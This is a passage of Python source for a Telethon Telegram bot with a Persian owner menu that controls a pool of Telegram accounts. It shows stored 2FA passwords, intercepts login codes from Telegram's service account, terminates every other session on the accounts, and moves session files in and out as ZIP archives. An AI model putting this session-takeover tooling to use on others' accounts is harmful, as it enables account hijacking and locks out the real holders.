      await sp_edit(event, txt, buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_enter_list"))
    async def cb_owner_enter_list(event):
      if not owner_guard(event):
          return await event.answer()
      if not sessions_db:
          await sp_edit(event, "هیچ اکانتی ثبت نشده.", buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      rows = []
      for sess in sessions_db:
          rows.append([Button.inline(f"🗂 {sess}", f"owner_enter_{sess}".encode())])
      rows.append([Button.inline("🔙 Back", b"owner_access")])
      await sp_edit(event, " کدوم اکانت رو می‌خوای وارد بشی؟\n(کد تلگرام به پیوی اونر فرستاده می‌شه)", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"owner_enter_(.+)"))
    async def cb_owner_enter_sess(event):
      if not owner_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      # avoid conflict with exact-data handlers like owner_enter_list
      if sess in ("list",):
          return await event.answer()
      info = sessions_db.get(sess)
      if not info:
          await sp_edit(event, " اکانت پیدا نشد.", buttons=[[Button.inline("🔙 Back", b"owner_enter_list")]])
          return await event.answer()
      phone = info.get("phone", "")
      twofa = info.get("twofa", "")
      twofa_line = f"\n🔐 رمز 2FA: ||{twofa}||" if twofa else "\n🔓 2FA ثبت نشده"
      is_online = sess in managed
      online_label = "🟢 آنلاین" if is_online else "🔴 آفلاین"
      listen_btn = (
          Button.inline("🔢 فقط گوش بده (بدون ارسال کد)", f"owner_listenonly_{sess}".encode())
          if is_online else
          Button.inline("👤 اکانت آفلاینه — نمیشه گوش داد", b"owner_enter_list")
      )
      await sp_edit(event,
          f" Login to Account «{sess}»\n شماره: `{phone}`{twofa_line}\n وضعیت: {online_label}\n\nبرای ارسال کد تایید دکمه زیر رو بزن:",
          buttons=[
              [Button.inline("🔢 Send Verify Code", f"owner_sendcode_{sess}".encode())],
              [listen_btn],
              [Button.inline("❌ Cancel", b"owner_enter_list")],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=b"owner_sendcode_(.+)"))
    async def cb_owner_sendcode(event):
      if not owner_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      info = sessions_db.get(sess)
      if not info:
          return await event.answer(" اکانت پیدا نشد", alert=True)
      phone = info.get("phone", "")
      twofa = info.get("twofa", "")
      twofa_line = f"\n🔐 رمز 2FA: ||{twofa}||" if twofa else "\n🔓 2FA ثبت نشده"
      await sp_edit(event,
          f" در حال ارسال کد به «{sess}»...\n شماره: `{phone}`",
          buttons=[[Button.inline("❌ Cancel", b"owner_enter_list")]])
      await event.answer()
      try:
          tmp = _make_client(tmp_sess_path(f"_takeover_{sess}"), session_name=f"_takeover_{sess}")
          await tmp.connect()
          await tmp.send_code_request(phone)
          owner_takeover_pending[sess] = {"phone": phone, "tmp": tmp, "chat_id": event.chat_id, "twofa": twofa}
          await sp_edit(event,
              f" کد ارسال شد — اکانت «{sess}»\n شماره: `{phone}`{twofa_line}\n\n منتظر دریافت کد از تلگرامم...\nبه محض اومدن کد، پیوی می‌فرستم.",
              buttons=[[Button.inline("❌ Cancel", b"owner_enter_list")]])
      except Exception as e:
          owner_takeover_pending.pop(sess, None)
          await sp_edit(event,
              f" خطا در ارسال کد: {e}",
              buttons=[[Button.inline("🔙 Back", b"owner_enter_list")]])

    @bot.on(events.CallbackQuery(pattern=b"owner_listenonly_(.+)"))
    async def cb_owner_listenonly(event):
      if not owner_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      info = sessions_db.get(sess)
      if not info:
          return await event.answer(" اکانت پیدا نشد", alert=True)
      if sess not in managed:
          return await event.answer(" اکانت آفلاینه، اول روشنش کن", alert=True)
      phone = info.get("phone", "")
      twofa = info.get("twofa", "")
      owner_takeover_pending[sess] = {
          "phone": phone,
          "twofa": twofa,
          "chat_id": OWNER_ID,
      }
      await sp_edit(event,
          f" حالت شنیداری فعال شد — اکانت «{sess}»\n"
          f" شماره: `{phone}`\n\n"
          f" منتظرم... هر پیامی از تلگرام (777000) بیاد، فوری پیوی می‌فرستم.\n"
          f"هیچ چیزی به اکانت ارسال نشد.",
          buttons=[
              [Button.inline("🔘 غیرفعال کردن", f"owner_listenstop_{sess}".encode())],
              [Button.inline("🔙 Back", b"owner_enter_list")],
          ])
      await event.answer(" حالت شنیداری فعال شد", alert=True)

    @bot.on(events.CallbackQuery(pattern=b"owner_listenstop_(.+)"))
    async def cb_owner_listenstop(event):
      if not owner_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      owner_takeover_pending.pop(sess, None)
      await event.answer(" حالت شنیداری غیرفعال شد", alert=True)
      await sp_edit(event,
          f" حالت شنیداری برای «{sess}» خاموش شد.",
          buttons=[[Button.inline("🔙 Back", b"owner_enter_list")]])

    # ── cache برای نتایج اسکن "نگه‌داشتن یک نشست" ──────────────
    _scan_keep_cache: Dict[int, list] = {}   # owner_id → [{label, dm, dp, da}, ...]

    @bot.on(events.CallbackQuery(data=b"owner_kill_list"))
    async def cb_owner_kill_list(event):
      if not owner_guard(event):
          return await event.answer()
      online_sessions = [s for s in sessions_db if s in managed]
      if not online_sessions:
          await sp_edit(event, "هیچ اکانت آنلاینی نیست.", buttons=[[Button.inline("🔙 Back", b"owner_access")]])
          return await event.answer()
      rows = []
      rows.append([Button.inline("📌 پاک کردن همه اکانت‌ها یکجا", b"owner_kill_all")])
      rows.append([Button.inline("🔍 اسکن و نگه‌داشتن فقط یک نشست", b"owner_scan_keep")])
      for sess in online_sessions:
          rows.append([Button.inline(f"🗂 {sess}", f"owner_kill_{sess}".encode())])
      rows.append([Button.inline("🔙 Back", b"owner_access")])
      await sp_edit(event,
          f" پاک‌سازی نشست‌های غیرمجاز\n"
          f"({len(online_sessions)} اکانت آنلاین)\n"
          f"━━━━━━━━━━━━━━\n"
          f"یه اکانت انتخاب کن یا همه رو یکجا پاک کن.\n"
          f"نشست ربات (hash=0) هرگز دست نمیخوره.",
          buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_scan_keep"))
    async def cb_owner_scan_keep(event):
      """اسکن همه اکانت‌ها — نشست‌های یافت‌شده رو نشون بده تا کاربر یکی رو برای نگه‌داشتن انتخاب کنه."""
      if not owner_guard(event):
          return await event.answer()
      online_sessions = [s for s in sessions_db if s in managed]
      if not online_sessions:
          await sp_edit(event, "هیچ اکانت آنلاینی نیست.", buttons=[[Button.inline("🔙 Back", b"owner_kill_list")]])
          return await event.answer()

      await event.answer(" در حال اسکن...")
      await sp_edit(event,
          f"🔍 در حال اسکن {len(online_sessions)} اکانت...\nلطفاً صبر کنید.",
          buttons=[[Button.inline("🔘 Please Wait...", b"noop")]])

      from telethon.tl.functions.account import GetAuthorizationsRequest

      # جمع‌آوری fingerprint های یکتا از همه اکانت‌ها
      seen: Dict[tuple, dict] = {}   # (dm, dp, da) → {label, dm, dp, da, accounts:[sess,...]}
      scan_errors = []

      async def _scan_one(sess):
          meta = managed.get(sess)
          if not meta:
              return
          try:
              result = await meta["client"](GetAuthorizationsRequest())
              for auth in result.authorizations:
                    if auth.hash == 0:
                        continue  # نشست ربات رو نادیده بگیر
                    dm = getattr(auth, "device_model", "?")
                    dp = getattr(auth, "platform", "?")
                    da = getattr(auth, "app_name", "?")
                    country = getattr(auth, "country", "?")
                    key = (dm, dp, da)
                    if key not in seen:
                        seen[key] = {
                            "label": f"{dm} / {dp} — {da} ({country})",
                            "dm": dm, "dp": dp, "da": da,
                            "accounts": []
                        }
                    if sess not in seen[key]["accounts"]:
                        seen[key]["accounts"].append(sess)
          except Exception as _e:
              scan_errors.append(f"{sess}: {str(_e)[:40]}")

      await asyncio.gather(*[_scan_one(s) for s in online_sessions])

      fingerprints = list(seen.values())
      if not fingerprints:
          msg = (
              "🔍 اسکن کامل شد\n━━━━━━━━━━━━━━\n"
              "هیچ نشست اضافه‌ای پیدا نشد.\n(همه اکانت‌ها فقط نشست ربات دارن)"
          )
          if scan_errors:
              msg += "\n\nخطاها:\n" + "\n".join(scan_errors[:5])
          await sp_edit(event, msg, buttons=[[Button.inline("🔙 Back", b"owner_kill_list")]])
          return

      # ذخیره در cache
      _scan_keep_cache[OWNER_ID] = fingerprints

      # ساخت دکمه‌ها — هر دکمه یه نشست برای نگه‌داشتن
      rows = []
      header_lines = [
          f"🔍 اسکن کامل — {len(fingerprints)} نشست یافت شد\n━━━━━━━━━━━━━━",
          f"روی نشستی که می‌خوای **نگه داری** کلیک کن.",
          f"بقیه روی همه اکانت‌ها ترمینیت می‌شن.\n(نشست ربات hash=0 همیشه محفوظ می‌مونه)\n━━━━━━━━━━━━━━",
      ]
      for i, fp in enumerate(fingerprints):
          accs = ", ".join(fp["accounts"][:3])
          if len(fp["accounts"]) > 3:
              accs += f" +{len(fp['accounts'])-3}"
          label = f"✅ نگه‌دار: {fp['dm']} / {fp['dp']} [{accs}]"
          rows.append([Button.inline(label[:60], f"owner_keeponly_{i}".encode())])
      rows.append([Button.inline("🔙 Back", b"owner_kill_list")])

      if scan_errors:
          header_lines.append("⚠️ خطا در اسکن بعضی اکانت‌ها:\n" + "\n".join(scan_errors[:3]))

      await sp_edit(event, "\n".join(header_lines), buttons=rows)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"owner_keeponly_(\d+)")))
    async def cb_owner_keeponly(event):
      """ترمینیت همه نشست‌ها به جز نشست انتخاب‌شده و hash=0 ربات."""
      if not owner_guard(event):
          return await event.answer()
      idx = int(event.pattern_match.group(1).decode())
      fingerprints = _scan_keep_cache.get(OWNER_ID, [])
      if idx >= len(fingerprints):
          await event.answer(" اطلاعات منقضی شده — دوباره اسکن کن", alert=True)
          return

      keep = fingerprints[idx]
      keep_key = (keep["dm"], keep["dp"], keep["da"])
      online_sessions = [s for s in sessions_db if s in managed]

      await event.answer(" در حال ترمینیت...")
      await sp_edit(event,
          f"⏳ در حال ترمینیت نشست‌ها...\n"
          f"نگه‌داشته می‌شه: {keep['dm']} / {keep['dp']} — {keep['da']}",
          buttons=[[Button.inline("🔘 Please Wait...", b"noop")]])

      from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest

      total_killed = 0
      total_kept   = 0
      total_failed = 0
      report_lines = []

      async def _keeponly_one(sess):
          nonlocal total_killed, total_kept, total_failed
          # سشن‌های سیستمی هرگز پاک نمیشن
          if sess in (MAIN_SESSION, "bot_session"):
              return
          meta = managed.get(sess)
          if not meta:
              return
          try:
              result = await meta["client"](GetAuthorizationsRequest())
              for auth in result.authorizations:
                    h = auth.hash
                    if h == 0:
                        continue  # نشست ربات — هرگز دست نزن
                    dm = getattr(auth, "device_model", "?")
                    dp = getattr(auth, "platform", "?")
                    da = getattr(auth, "app_name", "?")
                    fp_key = (dm, dp, da)
                    if fp_key == keep_key:
                        total_kept += 1
                        report_lines.append(f"   ✅ {sess}: {dm}/{dp} — نگه‌داشته شد")
                        continue
                    try:
                        await meta["client"](ResetAuthorizationRequest(hash=h))
                        total_killed += 1
                        report_lines.append(f"    {sess}: {dm}/{dp} — ترمینیت شد")
                    except Exception as _te:
                        total_failed += 1
                        report_lines.append(f"   ⚠️ {sess}: {dm}/{dp} — {str(_te)[:30]}")
          except Exception as _e:
              report_lines.append(f"   ❌ {sess}: {str(_e)[:40]}")

      await asyncio.gather(*[_keeponly_one(s) for s in online_sessions])

      # پاک کردن cache
      _scan_keep_cache.pop(OWNER_ID, None)

      summary = (
          f" ترمینیت انتخابی — کامل شد\n━━━━━━━━━━━━━━\n"
          f"✅ نگه‌داشته شد: {total_kept}\n"
          f" ترمینیت شد: {total_killed}\n"
          f"⚠️ ناموفق: {total_failed}\n"
          f"━━━━━━━━━━━━━━\n"
          f"نشست نگه‌داشته‌شده:\n"
          f"  {keep['dm']} / {keep['dp']} — {keep['da']}\n"
          f"━━━━━━━━━━━━━━\n"
      )
      detail = "\n".join(report_lines[:30])
      full_msg = summary + detail
      if len(full_msg) > 4000:
          full_msg = full_msg[:3950] + "\n…(بریده شد)"
      await sp_edit(event, full_msg, buttons=[[Button.inline("🔙 Back", b"owner_kill_list")]])

    @bot.on(events.CallbackQuery(data=b"owner_kill_all"))
    async def cb_owner_kill_all(event):
      if not owner_guard(event):
          return await event.answer()
      online_sessions = [s for s in sessions_db if s in managed]
      if not online_sessions:
          await sp_edit(event, "هیچ اکانت آنلاینی نیست.", buttons=[[Button.inline("🔙 Back", b"owner_kill_list")]])
          return await event.answer()
      await event.answer(" در حال پاک‌سازی همه اکانت‌ها...")
      await sp_edit(event,
          f" در حال پاک‌سازی {len(online_sessions)} اکانت به صورت موازی...\nلطفاً صبر کنید.",
          buttons=[[Button.inline("🔘 Please Wait...", b"noop")]])

      from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest

      total_killed = 0
      total_failed = 0
      total_none   = 0
      report_lines = []

      async def _clear_one(sess):
          nonlocal total_killed, total_failed, total_none
          # سشن‌های سیستمی هرگز پاک نمیشن
          if sess in (MAIN_SESSION, "bot_session"):
              return
          meta = managed.get(sess)
          if not meta:
              return
          try:
              result   = await meta["client"](GetAuthorizationsRequest())
              auth_map = {a.hash: a for a in result.authorizations}
              sess_killed = 0
              sess_failed = 0
              for h, auth_obj in auth_map.items():
                    if h == 0:
                        continue
                    try:
                        await meta["client"](ResetAuthorizationRequest(hash=h))
                        sess_killed += 1
                        total_killed += 1
                    except Exception:
                        sess_failed += 1
                        total_failed += 1
              if sess_killed == 0 and sess_failed == 0:
                    total_none += 1
                    report_lines.append(f"   {sess}: نشست اضافه‌ای نداشت")
              else:
                    parts = []
                    if sess_killed:
                        parts.append(f"{sess_killed}")
                    if sess_failed:
                        parts.append(f"{sess_failed}")
                    report_lines.append(f"  {'  '.join(parts)} {sess}")
          except Exception as _e:
              report_lines.append(f"   {sess}: {str(_e)[:40]}")

      await asyncio.gather(*[_clear_one(s) for s in online_sessions])

      summary = (
          f" پاک‌سازی کامل — همه اکانت‌ها\n"
          f"━━━━━━━━━━━━━━\n"
          f" terminate شد: {total_killed}\n"
          f" ناموفق: {total_failed}\n"
          f" بدون نشست اضافه: {total_none}\n"
          f"━━━━━━━━━━━━━━\n"
      )
      detail = "\n".join(report_lines)
      full_msg = summary + detail + "\n━━━━━━━━━━━━━━\n نشست‌های ربات (hash=0) دست نخوردن"
      # trim if too long for Telegram
      if len(full_msg) > 4000:
          full_msg = full_msg[:3950] + "\n…(بریده شد)"
      await sp_edit(event, full_msg, buttons=[[Button.inline("🔙 Back", b"owner_kill_list")]])

    @bot.on(events.CallbackQuery(pattern=b"owner_kill_(.+)"))
    async def cb_owner_kill_sess(event):
      if not owner_guard(event):
          return await event.answer()
      sess = event.pattern_match.group(1).decode()
      if sess in ("list", "all"):
          return await event.answer()
      # سشن‌های سیستمی هرگز دست نمیخورن
      if sess in (MAIN_SESSION, "bot_session"):
          return await event.answer(" این سشن سیستمیه و قابل پاک‌سازی نیست", alert=True)
      meta = managed.get(sess)
      if not meta:
          await sp_edit(event, f" اکانت «{sess}» آنلاین نیست.", buttons=[[Button.inline("🔙 Back", b"owner_kill_list")]])
          return await event.answer()
      await event.answer(" در حال پاک‌سازی...")
      try:
          from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
          result   = await meta["client"](GetAuthorizationsRequest())
          auth_map = {a.hash: a for a in result.authorizations}

          killed = []
          failed = []
          for h, auth_obj in auth_map.items():
              if h == 0:
                    continue  # همیشه نشست فعلی ربات رو نگه میداره
              device   = getattr(auth_obj, "device_model", "?")
              platform = getattr(auth_obj, "platform", "?")
              app      = getattr(auth_obj, "app_name", "?")
              country  = getattr(auth_obj, "country", "?")
              try:
                    await meta["client"](ResetAuthorizationRequest(hash=h))
                    killed.append(f"   {device}/{platform} — {app} — {country}")
              except Exception as _te:
                    failed.append(f"   {device}/{platform} — {str(_te)[:30]}")

          if not killed and not failed:
              msg = f" «{sess}»\nهیچ نشست دیگه‌ای پیدا نشد.\n(فقط نشست ربات فعاله)"
          else:
              lines = [f" پاک‌سازی نشست‌های «{sess}»\n━━━━━━━━━━━━━━"]
              if killed:
                    lines.append(f" terminate شد ({len(killed)}):")
                    lines.extend(killed)
              if failed:
                    lines.append(f" ناموفق ({len(failed)}):")
                    lines.extend(failed)
              lines.append(f"━━━━━━━━━━━━━━\n نشست ربات (hash=0) دست نخورد")
              msg = "\n".join(lines)

          await sp_edit(event, msg, buttons=[[Button.inline("🔙 Back", b"owner_kill_list")]])
      except Exception as e:
          await sp_edit(event, f" خطا: {e}", buttons=[[Button.inline("🔙 Back", b"owner_kill_list")]])

    # ── Owner: ایمپورت سشن‌ها از ZIP ────────────────────────────
    _waiting_session_import: Dict[int, bool] = {}

    @bot.on(events.CallbackQuery(data=b"owner_import_sessions"))
    async def cb_owner_import_sessions(event):
      if not owner_guard(event):
          return await event.answer()
      _waiting_session_import[OWNER_ID] = True
      await sp_edit(event,
          " ایمپورت سشن‌ها\n"
          "━━━━━━━━━━━━━━\n"
          "فایل ZIP حاوی سشن‌هات رو بفرست.\n\n"
          " فایل‌های قابل قبول:\n"
          "• sessions/*.session\n"
          "• sessions/*_state.json\n"
          "• data/sessions.json\n"
          "• data/groups.json\n\n"
          " سشن‌های موجود حذف نمیشن — فقط اضافه/جایگزین میشن",
          buttons=[[Button.inline("❌ Cancel", b"owner_import_cancel")]])
      await event.answer()

    @bot.on(events.CallbackQuery(data=b"owner_import_cancel"))
    async def cb_owner_import_cancel(event):
      if not owner_guard(event):
          return await event.answer()
      _waiting_session_import.pop(OWNER_ID, None)
      await sp_edit(event, "❌ عملیات ایمپورت لغو شد.",
                     buttons=[[Button.inline("🔙 Back", b"owner_access")]])
      await event.answer()

    @bot.on(events.NewMessage(chats=OWNER_ID))
    async def owner_session_import_handler(event):
      """دریافت ZIP سشن‌ها از اونر و استخراج به پوشه sessions/"""
      if not owner_guard(event):
          return
      if not _waiting_session_import.get(OWNER_ID):
          return
      if not event.document:
          return
      fname = ''
      for _attr in (event.document.attributes or []):
          _fn = getattr(_attr, 'file_name', None)
          if _fn:
              fname = _fn
              break
      mime = getattr(event.document, 'mime_type', '') or ''
      if not (fname.lower().endswith('.zip') or mime in ('application/zip', 'application/x-zip-compressed')):
          await bot.send_message(event.chat_id, " فایل باید ZIP باشه.")
          return
      _waiting_session_import.pop(OWNER_ID, None)
      status_msg = await bot.send_message(event.chat_id, " در حال استخراج سشن‌ها...")
      _status_id = getattr(status_msg, "id", None)
      import zipfile, io

      async def _edit_status(txt: str) -> None:
          """edit اگه id داریم، وگرنه send جدید."""
          nonlocal _status_id
          if _status_id:
              try:
                    await bot.edit_message(event.chat_id, _status_id, txt)
                    return
              except Exception:
                    pass
          m = await bot.send_message(event.chat_id, txt)
          _status_id = getattr(m, "id", None)

      try:
          zip_bytes = await bot.download_media(event.message, bytes)
          buf = io.BytesIO(zip_bytes)
          extracted = 0
          skipped = 0
          file_list = []
          new_sessions: list = []  # session names newly registered
          os.makedirs(SESSIONS_DIR, exist_ok=True)
          os.makedirs(DATA_DIR, exist_ok=True)
          extracted_session_names: list = []
          # ── فاز ۱: همه فایل‌های زیپ را در حافظه بافر کن و اعتبارسنجی کن ──
          # (هیچ چیزی روی دیسک نوشته نمیشه تا همه چیز تأیید بشه)
          staged: list = []   # list of (out_path, data_bytes)
          parsed_sessions_db: dict = {}
          parsed_groups_db: dict = {}
          has_sessions_json = False
          has_groups_json = False
          with zipfile.ZipFile(buf, 'r') as zf:
              for member in zf.infolist():
                    name = member.filename
                    if name.endswith('/'):
                        continue
                    basename = os.path.basename(name)
                    if not basename:
                        continue
                    if basename.endswith('.session'):
                        out_path = os.path.join(SESSIONS_DIR, basename)
                    elif basename.endswith('-journal'):
                        out_path = os.path.join(SESSIONS_DIR, basename)
                    elif basename.endswith('_state.json'):
                        out_path = os.path.join(SESSIONS_DIR, basename)
                    elif basename == 'sessions.json':
                        out_path = SESSIONS_DB
                        has_sessions_json = True
                    elif basename == 'groups.json':
                        out_path = GROUPS_DB
                        has_groups_json = True
                    elif basename == 'blacklist.json':
                        out_path = BLACKLIST_DB
                    elif basename == 'co_owners.json':
                        out_path = CO_OWNERS_DB
                    else:
                        skipped += 1
                        continue
                    with zf.open(member) as src:
                        data = src.read()
                    staged.append((out_path, basename, data))
          # اعتبارسنجی sessions.json قبل از هر نوشتنی
          if has_sessions_json:
              for _, bname, data in staged:
                    if bname == 'sessions.json':
                        try:
                            _parsed = json.loads(data)
                            if not isinstance(_parsed, dict):
                                raise ValueError(
                                    f"باید JSON object باشه، نه {type(_parsed).__name__}")
                            parsed_sessions_db = _parsed
                        except Exception as _e:
                            await _edit_status(
                                f" sessions.json داخل زیپ معتبر نیست:\n{_e}\n\n"
                                f"هیچ فایلی روی دیسک نوشته نشد. عملیات لغو شد.")
                            return
                        break
          # اعتبارسنجی groups.json قبل از هر نوشتنی
          if has_groups_json:
              for _, bname, data in staged:
                    if bname == 'groups.json':
                        try:
                            _parsed_groups = json.loads(data)
                            if not isinstance(_parsed_groups, dict):
                                raise ValueError(
                                    f"باید JSON object باشه، نه {type(_parsed_groups).__name__}")
                            parsed_groups_db = _parsed_groups
                        except Exception as _e:
                            await _edit_status(
                                f" groups.json داخل زیپ معتبر نیست:\n{_e}\n\n"
                                f"هیچ فایلی روی دیسک نوشته نشد. عملیات لغو شد.")
                            return
                        break
          # ── فاز ۲: همه فایل‌ها را روی دیسک بنویس ──
          for out_path, basename, data in staged:
              with open(out_path, 'wb') as dst:
                    dst.write(data)
              extracted += 1
              file_list.append(f"• {basename} ({len(data):,} bytes)")
              if basename.endswith('.session'):
                    extracted_session_names.append(basename[:-len('.session')])
          # Restore session metadata and remote membership together.  This is
          # what keeps every session in the same remote after a full export
          # is imported on a different installation.
          layout_result = merge_imported_session_layout(
              parsed_sessions_db if has_sessions_json else {},
              parsed_groups_db if has_groups_json else {},
              extracted_session_names,
          )
          new_sessions = layout_result["new_sessions"]
          if layout_result["had_session_data"]:
              save_db()
          if layout_result["had_group_data"]:
              save_groups()
          files_text = "\n".join(file_list[:20])
          if len(file_list) > 20:
              files_text += f"\n... و {len(file_list)-20} فایل دیگه"
          new_sess_text = ""
          if new_sessions:
              new_sess_text = f" سشن‌های جدید ثبت‌شده: {len(new_sessions)}\n" + \
                                "\n".join(f"  – {s}" for s in new_sessions[:10]) + \
                                (f"\n  ... و {len(new_sessions)-10} سشن دیگه" if len(new_sessions) > 10 else "") + "\n\n"
          remote_text = ""
          if layout_result["had_group_data"]:
              remote_text = (
                  f"🗂 ریموت‌های بازیابی‌شده: {layout_result['remotes_restored']}"
                  f"   ➕ ساخته‌شده: {layout_result['remotes_created']}\n"
                  f"✅ دسته‌بندی و Owner ریموت‌ها هم اعمال شد.\n\n"
              )
          duplicate_text = ""
          if layout_result["duplicate_memberships"]:
              duplicate_text = (
                  f"⚠️ {len(layout_result['duplicate_memberships'])} سشن در چند ریموت تکرار شده بود؛ "
                  "اولین دسته‌بندی نگه داشته شد.\n\n"
              )
          # ── سشن‌های جدید رو مستقیم start کن — بدون restart ──
          started = 0
          failed_start = 0
          for sess_name in new_sessions:
              if sess_name not in manually_disabled:
                    try:
                        await start_worker(sess_name)
                        if sess_name in managed:
                            started += 1
                        else:
                            failed_start += 1
                    except Exception:
                        failed_start += 1
                    await asyncio.sleep(0.5)
          start_text = ""
          if new_sessions:
              start_text = f"🚀 Start شدن: {started}   ❌ ناموفق: {failed_start}\n\n"
          await _edit_status(
              f"✅ ایمپورت سشن‌ها کامل شد!\n"
              f"━━━━━━━━━━━━━━\n"
              f"📂 استخراج شده: {extracted} فایل\n"
              f"⏭ رد شده: {skipped} فایل\n\n"
              f"{files_text}\n\n"
              f"{new_sess_text}"
              f"{remote_text}"
              f"{duplicate_text}"
              f"{start_text}"
              f"✅ سشن‌های جدید آنلاین شدن — نیازی به ریستارت نیست.")
      except Exception as e:
          await _edit_status(f"❌ خطا در استخراج: {e}")

    # ── helper: build and send a sessions ZIP for a given set of session names (or ALL) ──
    async def _do_export_zip(chat_id: int, gname: Optional[str] = None) -> None:
        """اگر gname داده شه فقط سشن‌های اون ریموت اکسپورت میشه، وگرنه همه."""
        import zipfile, io
        status_msg = await bot.send_message(chat_id, "📦 در حال زیپ کردن سشن‌ها...")

        async def _show_export_status(text: str) -> None:
            """Update the progress message, falling back to a new message."""
            try:
                await bot.edit_message(chat_id, status_msg.id, text)
            except Exception:
                try:
                    await bot.send_message(chat_id, text)
                except Exception:
                    pass

        try:
            buf = io.BytesIO()
            added = 0
            session_files_added = 0
            # تعیین لیست سشن‌های مجاز (اگه فیلتر ریموت داریم)
            allowed: Optional[Set[str]] = None
            if gname is not None:
                raw = groups_db.get(gname, {}).get("sessions", [])
                allowed = set(raw)

            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
                # sessions/**/*.session , *-journal , *_state.json , *_media_*  (recursive)
                if os.path.isdir(SESSIONS_DIR):
                    for root, dirs, files in os.walk(SESSIONS_DIR):
                        dirs[:] = [d for d in dirs if d != "tmp"]
                        for fn in files:
                            if fn.endswith((".session", "-journal", "_state.json")) or "_media_" in fn:
                                # نام بیس سشن (بدون پسوند) برای مقایسه با allowed
                                base = fn.split(".")[0]
                                if allowed is not None and base not in allowed:
                                    continue
                                fpath = os.path.join(root, fn)
                                arcname = os.path.join("sessions", os.path.relpath(fpath, SESSIONS_DIR))
                                zf.write(fpath, arcname=arcname)
                                added += 1
                                session_files_added += 1
                # data JSON فقط در اکسپورت کامل
                if allowed is None:
                    for db_file in (SESSIONS_DB, GROUPS_DB, BLACKLIST_DB, CO_OWNERS_DB):
                        if os.path.isfile(db_file):
                            zf.write(db_file, arcname=os.path.join("data", os.path.basename(db_file)))
                            added += 1
            if session_files_added == 0:
                scope = f"ریموت «{gname}»" if gname is not None else "کل سرور"
                await bot.edit_message(
                    chat_id,
                    status_msg.id,
                    f"❌ هیچ فایل سشنی برای {scope} پیدا نشد.\n"
                    f"مسیر بررسی‌شده: {SESSIONS_DIR}\n\n"
                    "اگر روی سرور قبلی سشن‌ها وجود دارند، اول از همان سرور Export بگیر "
                    "یا پوشه sessions/ و data/ را به همین محل منتقل کن.",
                )
                return
            buf.seek(0)
            label = gname if gname else "همه ریموت‌ها"
            fname = f"export_{gname}.zip" if gname else "sessions_backup.zip"
            # Telethon derives the document name from the file-like object's
            # ``name`` attribute.  ``send_file(file_name=...)`` is not a
            # supported argument in Telethon 1.44 and can silently leave the
            # progress message stuck on older versions.
            buf.name = fname
            zip_size = buf.getbuffer().nbytes
            await _show_export_status(
                f"✅ زیپ آماده شد — {session_files_added} فایل سشن "
                f"+ {added - session_files_added} فایل دیتا\n"
                f"📦 حجم: {zip_size / (1024 * 1024):.2f} MB\n"
                "⏳ در حال ارسال فایل..."
            )
            caption = (
                f"📦 بکاپ سشن‌ها — {label}\n"
                f"━━━━━━━━━━━━━━\n"
                f"فایل‌های سشن: {session_files_added}\n"
                f"فایل‌های دیتا: {added - session_files_added}\n"
                f"برای بازیابی: Import Sessions (ZIP) رو بزن و این فایل رو بفرست."
            )
            await asyncio.wait_for(
                bot.send_file(
                    chat_id,
                    buf,
                    caption=caption,
                    force_document=True,
                ),
                timeout=600,
            )
            try:
                await bot.delete_messages(chat_id, [status_msg.id])
            except Exception:
                pass
        except Exception as _e:
            log.warning(f"[export] failed: {_e}")
            await _show_export_status(
                f"❌ ارسال/ساخت ZIP ناموفق شد:\n"
                f"{type(_e).__name__}: {str(_e)[:500]}"
            )

    def _export_select_text() -> str:
        lines = ["📦 Export Sessions\n━━━━━━━━━━━━━━\nیه ریموت انتخاب کن یا همه رو اکسپورت بگیر:\n"]
        for g, info in groups_db.items():
            cnt = len(info.get("sessions", []))
            lines.append(f"• {g}  ({cnt} اکانت)")
        return "\n".join(lines)

    def _export_select_buttons():
        btns = [[Button.inline("📦 Export All — همه ریموت‌ها", b"owner_export_all")]]
        for g in groups_db:
            cnt = len(groups_db[g].get("sessions", []))
            safe = g.encode()
            btns.append([
                Button.inline(f"📤 {g} ({cnt})", b"owner_export_grp|" + safe),
                Button.inline(f"🗑 حذف {g}", b"owner_del_grp_sess|" + safe),
            ])
        btns.append([Button.inline("🔙 Back", b"owner_access")])
        return btns

    @bot.on(events.CallbackQuery(data=b"owner_export_sessions"))
    async def cb_owner_export_sessions(event):
        if not owner_guard(event):
            return await event.answer()
        await event.answer()
        await sp_edit(event, _export_select_text(), buttons=_export_select_buttons())

    @bot.on(events.CallbackQuery(data=b"owner_export_all"))
    async def cb_owner_export_all(event):
        if not owner_guard(event):
            return await event.answer()
        await event.answer("⏳ در حال ساخت زیپ...")
        await _do_export_zip(event.chat_id, gname=None)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"owner_export_grp\|(.+)")))
    async def cb_owner_export_grp(event):
        if not owner_guard(event):
            return await event.answer()
        gname = event.pattern_match.group(1).decode()
        await event.answer(f"⏳ در حال زیپ کردن {gname}...")
        await _do_export_zip(event.chat_id, gname=gname)

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"owner_del_grp_sess\|(.+)")))
    async def cb_owner_del_grp_sess(event):
        if not owner_guard(event):
            return await event.answer()
        gname = event.pattern_match.group(1).decode()
        cnt = len(groups_db.get(gname, {}).get("sessions", []))
        await event.answer()
        await sp_edit(
            event,
            f"🗑 حذف سشن‌های ریموت از دیتابیس\n━━━━━━━━━━━━━━\n"
            f"ریموت: {gname}\n"
            f"تعداد اکانت: {cnt}\n\n"
            f"⚠️ این دکمه فقط رکورد دیتابیس رو پاک می‌کنه.\n"
            f"فایل‌های سشن روی دیسک دست‌نخورده می‌مونن.\n"
            f"آیا مطمئنی؟",
            buttons=[
